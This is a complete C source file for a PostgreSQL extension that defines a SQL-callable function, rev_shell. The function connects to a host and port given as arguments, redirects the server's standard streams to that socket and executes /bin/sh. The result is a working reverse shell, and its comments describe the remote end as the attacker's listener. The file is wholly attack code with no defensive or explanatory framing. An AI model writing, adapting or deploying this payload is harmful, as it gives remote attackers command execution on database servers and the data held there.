#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>

#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"

PG_MODULE_MAGIC;

PG_FUNCTION_INFO_V1(rev_shell);

Datum
rev_shell(PG_FUNCTION_ARGS)
{
    // Get arguments passed from PostgreSQL function call
    char *LHOST = text_to_cstring(PG_GETARG_TEXT_PP(0));  // Convert first argument (TEXT) to C string (IP address)
    int32 LPORT = PG_GETARG_INT32(1);                     // Get second argument (INT) as port number

    // Define and initialize server address structure
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;                       // Use IPv4
    serv_addr.sin_port = htons(LPORT);                    // Convert port to network byte order
    inet_pton(AF_INET, LHOST, &serv_addr.sin_addr);        // Convert IP string to binary form and store in struct

    // Create a socket (IPv4, TCP)
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    // Connect to the remote host (attacker's listener)
    int client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    // Redirect standard input, output, and error to the socket
    dup2(sock, 0);  // STDIN
    dup2(sock, 1);  // STDOUT
    dup2(sock, 2);  // STDERR

    // Execute a new shell process, providing remote shell access
    execve("/bin/sh", NULL, NULL);

    // Return integer 0 (though control likely never reaches here)
    PG_RETURN_INT32(0);
}